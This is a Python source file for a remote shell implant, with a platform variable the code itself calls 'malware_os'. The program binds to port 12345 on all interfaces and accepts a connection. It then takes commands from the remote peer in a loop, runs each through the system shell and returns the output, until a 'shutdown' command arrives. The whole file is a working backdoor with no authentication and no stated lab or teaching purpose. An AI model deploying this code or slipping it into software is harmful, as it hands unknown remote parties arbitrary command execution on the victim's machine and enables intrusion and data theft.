import socket
import sys
from subprocess import Popen, PIPE
import platform
import os
from Communication import Communication


class Shell:
    command = ""

    def __init__(self, malware_os, communication):
        self._os = malware_os
        self._response = ""
        self._communication = communication

    def receive(self):
        self.command = self._communication.recv_message_str()

    def execute_command(self):
        self.result = None
        if self.command[:2] == "cd":
            path = self.command[3:]
            if os.path.isdir(path):
                os.chdir(path)
                if self._os == "Windows":
                    self.result = Popen("cd", shell=True, stdout=PIPE)
                else:
                    self.result = Popen("pwd", shell=True, stdout=PIPE)
            else:
                self._response = (str("[!] This directory does not exist").encode("utf-8"))
        else:
            self.result = Popen(self.command, shell=True, stdout=PIPE)
        if self.result != None:
            self._response = self.result.communicate()

    def send(self):
        self._response = self._response[0]
        self._communication.send(self._response.decode("utf-8", errors="ignore"))


def run_commands(malware_os, communication):
    shell = Shell(malware_os, communication)
    while shell.command != "shutdown":
        shell.receive()
        if shell.command != "shutdown":
            shell.execute_command()
            shell.send()
    communication.send("ok")
    sys.exit(0)

def connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = "0.0.0.0"
    s.bind((host_ip, 12345))
    s.listen(5)
    distant_socket, addr = s.accept()
    return distant_socket


def main():
    distant_socket = connection()
    communication = Communication(distant_socket)
    message = communication.recv_message_str()
    malware_os = platform.system()
    while message != "os":
        message = communication.recv_message_str()
    communication.send(malware_os)
    run_commands(malware_os, communication)
    distant_socket.close()


if __name__ == "__main__":
    main()
